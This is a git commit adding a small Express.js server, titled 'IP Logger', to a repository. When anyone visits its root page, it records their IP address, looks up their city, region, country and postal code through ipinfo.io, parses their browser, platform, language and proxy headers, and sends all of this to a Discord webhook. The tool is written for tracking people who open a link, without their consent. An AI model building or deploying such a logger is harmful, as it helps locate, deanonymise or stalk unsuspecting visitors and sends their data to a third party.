cee0e75ea87ee6127a7bf9a7fe86492e253b4ad6
JohnWick000101 <127307440+JohnWick000101@users.noreply.github.com>
2023-03-19 01:33:30 -0400

    initial commit

---
+++ index.js
@@ -0,0 +1,48 @@
+const express = require('express');
+const { Webhook, MessageBuilder } = require('discord-webhook-node');
+const fetch = require('node-fetch');
+
+const app = express();
+const port = process.env.PORT || 3000;
+const webhook = new Webhook('YOUR_WEBHOOK_URL');
+
+app.get('/', async (req, res) => {
+  const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const response = await fetch(`https://ipinfo.io/${ipAddress}/json`);
+  const data = await response.json();
+
+  const region = data.region;
+  const city = data.city;
+  const country = data.country;
+  const postal = data.postal;
+  const userAgent = req.headers['user-agent'];
+  const supportedLanguages = ["en", "nl", "it", 'de', 'ru', 'cn','in','hk'];
+  const lang = req.headers['accept-language'].split(',')[0];
+  const platform = userAgent.split('(')[1].split(')')[0];
+  const browser = userAgent.split('/')[0];
+  const isProxy = req.headers['via'] || req.headers['x-forwarded-for'];
+
+  const embed = new MessageBuilder()
+    .setTitle('IP Logger')
+    .setDescription('This is an IP logger made by https://github.com/baum1810')
+    .addField('IP', ipAddress)
+    .addField('Country', country)
+    .addField('Region', region)
+    .addField('City', city)
+    .addField('Postal', postal)
+    .addField('User Agent', userAgent)
+    .addField('Browser Language', lang)
+    .addField('Platform', platform)
+    .addField('Browser', browser)
+    .addField('Proxy/VPN', isProxy ? 'Yes' : 'No')
+    .setColor('#5CDBF0')
+    .setTimestamp();
+
+  webhook.send(embed);
+
+  res.send('IP address logged');
+});
+
+app.listen(port, () => {
+  console.log(`App listening at http://localhost:${port}`);
+});
